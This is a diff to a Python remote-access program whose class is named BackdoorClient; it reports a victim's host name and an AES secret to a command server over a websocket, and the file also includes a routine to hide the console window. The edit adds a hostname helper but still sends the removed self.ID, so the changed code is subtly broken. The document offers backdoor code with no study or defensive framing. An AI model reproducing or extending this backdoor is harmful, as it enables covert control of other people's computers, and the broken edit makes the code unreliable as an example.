@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-# coding:utf-8
+# -*- coding: utf-8 -*-
 import os
 import ctypes
 import subprocess
@@ -18,7 +18,7 @@ class BackdoorClient(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
         self.SERVER_HOST = 'http://127.0.0.1:8888'
-        self.ID = str(uuid.uuid5(uuid.NAMESPACE_DNS, str(uuid.getnode())))
+        self.HOST_NAME = hostname()
         self.IV = '\0' * AES.block_size
         self.SECRET = os.urandom(32)
         self.ws = None
@@ -31,7 +31,7 @@ class BackdoorClient(threading.Thread):
             try:
                 self.ws = create_connection("ws://localhost:8888/")
 
-                sercret_msg = {'id': self.ID, 'secret': b64encode(self.SECRET)}
+                sercret_msg = {'host_name': self.ID, 'secret': b64encode(self.SECRET)}
                 self.ws.send(json.dumps(sercret_msg))
 
                 time.sleep(1)
@@ -93,6 +93,22 @@ class ShowDialog(threading.Thread):
 
     def run(self):
         ctypes.windll.user32.MessageBoxW(None, self.content, self.title, 0)
+
+
+def hostname():
+    sys = os.name
+
+    if sys == 'nt':
+        return os.getenv('computername')
+    elif sys == 'posix':
+        host = os.popen('echo $HOSTNAME')
+        try:
+            name = host.read()
+            return name
+        finally:
+            host.close()
+    else:
+        return 'Unkwon hostname'
 
 
 def hide_cmd_window():
